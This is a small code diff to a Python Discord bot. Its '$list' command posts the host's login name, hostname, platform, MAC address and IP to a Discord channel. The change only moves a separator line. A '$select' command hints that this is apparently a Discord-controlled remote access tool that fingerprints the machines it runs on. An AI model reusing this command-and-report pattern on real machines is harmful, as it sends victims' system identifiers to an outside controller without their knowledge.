@@ -36,13 +36,13 @@ async def on_message(message):
         return
 
     if message.content.startswith('$list'):
-        await message.channel.send(os.getlogin() + ' | ' + platform.node() + '\n```' + 
+        await message.channel.send('-'*64 + 
+            os.getlogin() + ' | ' + platform.node() + '\n```' + 
             'platform: ' + platform.platform() + '\n' +
             'MAC: ' + str(getnode()) + '\n' +
             'IP: ' + ip + '\n' +
             '```' +
-            selinfo + '\n' +
-            '-'*64
+            selinfo + '\n' 
         )
 
     if message.content.startswith('$select'):
